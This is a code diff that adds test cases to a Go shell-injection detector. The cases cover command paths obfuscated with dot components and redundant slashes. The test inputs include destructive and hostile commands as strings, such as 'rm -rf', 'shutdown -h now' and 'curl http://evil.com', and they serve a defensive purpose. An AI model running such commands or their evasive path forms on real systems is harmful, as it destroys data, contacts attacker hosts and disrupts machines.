@@ -149,4 +149,22 @@ func TestDetectShellInjection(t *testing.T) {
 		isShellInjection(t, "sleep\f10", "sleep\f10")
 		isShellInjection(t, "shutdown\f-h\fnow", "shutdown\f-h\fnow")
 	})
+
+	t.Run("detects non-canonical paths with dot components", func(t *testing.T) {
+		isShellInjection(t, "/bin/./rm -rf /tmp/x", "/bin/./rm")
+		isShellInjection(t, "/usr/./bin/curl http://evil.com", "/usr/./bin/curl")
+		isShellInjection(t, "/sbin/././shutdown -h now", "/sbin/././shutdown")
+	})
+
+	t.Run("detects non-canonical paths with redundant separators", func(t *testing.T) {
+		isShellInjection(t, "/bin//rm -rf /tmp/x", "/bin//rm")
+		isShellInjection(t, "/usr//bin//curl http://evil.com", "/usr//bin//curl")
+		isShellInjection(t, "/sbin///shutdown -h now", "/sbin///shutdown")
+	})
+
+	t.Run("detects non-canonical paths with mixed dot and redundant separators", func(t *testing.T) {
+		isShellInjection(t, "/bin//./rm -rf /tmp/x", "/bin//./rm")
+		isShellInjection(t, "/usr/.//bin/curl http://evil.com", "/usr/.//bin/curl")
+		isShellInjection(t, "/sbin//.//shutdown -h now", "/sbin//.//shutdown")
+	})
 }
